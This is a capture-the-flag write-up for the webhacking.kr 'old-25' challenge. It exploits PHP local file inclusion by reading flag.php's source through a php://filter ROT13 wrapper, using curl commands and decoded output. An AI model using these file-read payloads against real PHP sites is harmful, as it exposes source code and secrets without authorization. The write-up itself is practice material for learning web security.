# Old 25    PHP LFI

URL: [http://webhacking.kr:10001/?file=hello](http://webhacking.kr:10001/?file=hello)

From the url it seems we can control which file we see:
![old-25.png](/assets/ctf/webhacking.kr/old-25.png)

```powershell
➜ curl http://webhacking.kr:10001/?file=flag -b 'PHPSESSID=3052403292' -s | sls '<body>' -Context 0,100

> <body>
  <pre>total 20
  drwxr-xr-x 2 root root 4096 Aug 24  2019 .
  drwxr-xr-x 3 root root 4096 Aug 24  2019 ..
  -rw-r--r-- 1 root root   82 Aug 24  2019 flag.php
  -rw-r--r-- 1 root root   31 Aug 24  2019 hello.php
  -rw-r--r-- 1 root root  605 Aug 24  2019 index.php
  </pre><hr><textarea rows=10 cols=100>FLAG is in the code</textarea></body>
  </html>
```

We can utilize PHP filter wrappers to read PHP code, such as ROT13 and many others.
```powershell
➜ curl 'http://webhacking.kr:10001/?file=php://filter/read=string.rot13/resource=flag' -b 'PHPSESSID=3052403292' -s | sls '<body>' -Context 0,100 | py -c "import codecs, sys; print(codecs.decode(sys.stdin.read(), 'rot13'))"

> <obql>
  <cer>gbgny 20
  qejke-ke-k 2 ebbg ebbg 4096 Nht 24  2019 .
  qejke-ke-k 3 ebbg ebbg 4096 Nht 24  2019 ..
  -ej-e--e-- 1 ebbg ebbg   82 Nht 24  2019 synt.cuc
  -ej-e--e-- 1 ebbg ebbg   31 Nht 24  2019 uryyb.cuc
  -ej-e--e-- 1 ebbg ebbg  605 Nht 24  2019 vaqrk.cuc
  </cer><ue><grkgnern ebjf=10 pbyf=100><?php
    echo "FLAG is in the code";
    $flag = "FLAG{this_is_your_first_flag}";
  ?>
  </grkgnern></obql>
  </ugzy>
```